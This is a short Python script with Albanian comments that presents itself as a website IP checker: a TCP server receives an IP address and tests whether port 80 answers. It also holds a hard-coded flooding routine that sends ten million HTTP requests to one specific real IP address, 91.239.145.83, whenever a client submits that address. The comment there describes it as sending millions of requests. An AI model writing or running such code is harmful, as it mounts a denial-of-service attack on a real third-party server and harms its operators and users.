import socket
import threading
import time

def check_website(ip_address):
    try:
        # Sheno kërkesën tek uebsajti duke përdorur IP adresën
        socket.setdefaulttimeout(2)
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((ip_address, 80))
        conn.sendall(b"GET / HTTP/1.1\r\nHost: " + ip_address.encode() + b"\r\n\r\n")
        response = conn.recv(4096)
        conn.close()

        # Përpunoni përgjigjen për të verifikuar nëse është valide
        if response:
            return True
        else:
            return False
    except socket.error:
        return False

def handle_client(client_socket, website_ip):
    # Verifikoni nëse adresa IP është valide dhe përket një uebsajti
    if check_website(website_ip):
        response = "Ju keni shënuar këtë IP adresë: {}, dhe kjo IP adresë i përket këtij uebsajti.".format(website_ip)
        client_socket.send(response.encode())
    else:
        response = "Ju keni shënuar këtë IP adresë: {}, por, kjo IP adresë nuk i përket asnjë uebsajti.".format(website_ip)
        client_socket.send(response.encode())
    
    # Ndoshta kodet e mëposhtme mund të modifikohen sipas nevojës
    time.sleep(5)
    
    # Shënimi i kodit për dërgimin e miliona kërkesave në IP adresën 91.239.145.83
    if website_ip == "91.239.145.83":
        for _ in range(10000000):
            if check_website(website_ip):
                print("Dërguar kërkesë tek uebsajti: {}".format(website_ip))
    
    # Këtu ndaloj dërgimin e kërkesave dhe afishoj një mesazh për përfundimin e punës
    response = "Puna është përfunduar me sukses."
    client_socket.send(response.encode())
    client_socket.close()

def start_server():
    host = "91.239.145.83"  # Adresa IP e serverit
    port = 8888  # Porta e serverit

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print("Serveri filloi dëgjimin në {}:{}".format(host, port))

    while True:
        client_socket, addr = server_socket.accept()
        print("Lidhja u pranua prej: {}".format(addr[0]))
        
        # Merrni adresën IP të shënuar nga klienti
        website_ip = client_socket.recv(1024).decode().strip()

        # Krijo një thred për të trajtuar klientin
        client_thread = threading.Thread(target=handle_client, args=(client_socket, website_ip))
        client_thread.start()

start_server()
